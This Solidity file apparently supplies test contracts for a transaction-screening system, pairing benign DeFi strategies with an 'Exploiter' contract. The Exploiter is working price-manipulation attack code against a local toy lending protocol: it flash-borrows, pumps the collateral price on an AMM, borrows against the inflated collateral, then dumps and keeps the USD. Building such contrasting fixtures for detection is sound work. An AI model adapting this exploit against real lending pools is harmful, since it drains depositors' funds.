// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SimpleAMM, FlashLender, IFlashBorrower, LendingPool} from "./Protocol.sol";

/// Shared wiring for user-owned contracts that act on the protocol inside gated transactions.
abstract contract UserContract is IFlashBorrower {
    address public immutable owner;
    LendingPool public immutable pool;
    SimpleAMM public immutable amm;
    FlashLender public immutable lender;
    IERC20 public immutable col;
    IERC20 public immutable usd;

    constructor(LendingPool pool_, FlashLender lender_) {
        SimpleAMM amm_ = pool_.amm();
        IERC20 col_ = pool_.col();
        IERC20 usd_ = pool_.usd();
        owner = msg.sender;
        pool = pool_;
        amm = amm_;
        lender = lender_;
        col = col_;
        usd = usd_;
        col_.approve(address(amm_), type(uint256).max);
        usd_.approve(address(amm_), type(uint256).max);
        col_.approve(address(pool_), type(uint256).max);
        usd_.approve(address(pool_), type(uint256).max);
    }

    function _sweep() internal {
        usd.transfer(owner, usd.balanceOf(address(this)));
        col.transfer(owner, col.balanceOf(address(this)));
    }
}

/// Malicious: pump COL on the AMM, post collateral at the inflated price, borrow, dump, keep the USD.
contract Exploiter is UserContract {
    constructor(LendingPool pool_, FlashLender lender_) UserContract(pool_, lender_) {}

    function attack(uint256 pumpUsd, uint256 depositCol, uint256 borrowBps, uint256 chunks, bool useFlash) external {
        if (useFlash) {
            lender.flashLoan(usd, pumpUsd, abi.encode(depositCol, borrowBps, chunks));
        } else {
            _run(pumpUsd, depositCol, borrowBps, chunks);
        }
        _sweep();
    }

    function onFlashLoan(IERC20, uint256 amount, bytes calldata data) external {
        require(msg.sender == address(lender), "lender only");
        (uint256 depositCol, uint256 borrowBps, uint256 chunks) = abi.decode(data, (uint256, uint256, uint256));
        _run(amount, depositCol, borrowBps, chunks);
        usd.transfer(address(lender), amount);
    }

    function _run(uint256 pumpUsd, uint256 depositCol, uint256 borrowBps, uint256 chunks) internal {
        uint256 bought;
        for (uint256 i = 0; i < chunks; i++) {
            bought += amm.swap(address(usd), pumpUsd / chunks, 0, address(this));
        }
        pool.depositCollateral(depositCol);
        uint256 amount = pool.maxBorrow(address(this)) * borrowBps / 10_000;
        uint256 available = usd.balanceOf(address(pool));
        pool.borrow(amount > available ? available : amount);
        amm.swap(address(col), bought, 0, address(this));
    }
}

/// Benign: ordinary strategies whose shape resembles an exploit (flash loans, swaps, pool calls).
contract Strategy is UserContract {
    uint8 private constant MODE_DELEVERAGE = 1;
    uint8 private constant MODE_ROUND_TRIP = 2;

    constructor(LendingPool pool_, FlashLender lender_) UserContract(pool_, lender_) {}

    /// Leverage zap: buy COL with USD, post it, borrow a fraction of the allowed amount.
    function zap(uint256 usdIn, uint256 borrowBps) external {
        uint256 bought = amm.swap(address(usd), usdIn, 0, address(this));
        pool.depositCollateral(bought);
        pool.borrow(pool.maxBorrow(address(this)) * borrowBps / 10_000 - pool.debtOf(address(this)));
        _sweep();
    }

    /// Flash-loan deleverage: repay all debt with borrowed USD, withdraw collateral, sell just enough COL.
    function deleverage() external {
        uint256 debt = pool.debtOf(address(this));
        lender.flashLoan(usd, debt, abi.encode(MODE_DELEVERAGE));
        _sweep();
    }

    /// Flash-funded round trip through the AMM (an arbitrage attempt that never touches the pool).
    function roundTrip(uint256 usdAmount) external {
        lender.flashLoan(usd, usdAmount, abi.encode(MODE_ROUND_TRIP));
        _sweep();
    }

    /// Whale buy with own funds: moves the price a lot but takes nothing from the pool.
    function bigBuy(uint256 usdIn) external {
        amm.swap(address(usd), usdIn, 0, address(this));
        _sweep();
    }

    function onFlashLoan(IERC20, uint256 amount, bytes calldata data) external {
        require(msg.sender == address(lender), "lender only");
        uint8 mode = abi.decode(data, (uint8));
        if (mode == MODE_DELEVERAGE) {
            pool.repay(amount);
            pool.withdrawCollateral(pool.collateralOf(address(this)));
            // sell exactly enough COL to cover the flash loan
            uint256 colNeeded = amm.getAmountIn(address(col), amount);
            uint256 colBal = col.balanceOf(address(this));
            amm.swap(address(col), colNeeded > colBal ? colBal : colNeeded, 0, address(this));
        } else {
            uint256 bought = amm.swap(address(usd), amount, 0, address(this));
            amm.swap(address(col), bought, 0, address(this));
        }
        usd.transfer(address(lender), amount);
    }
}
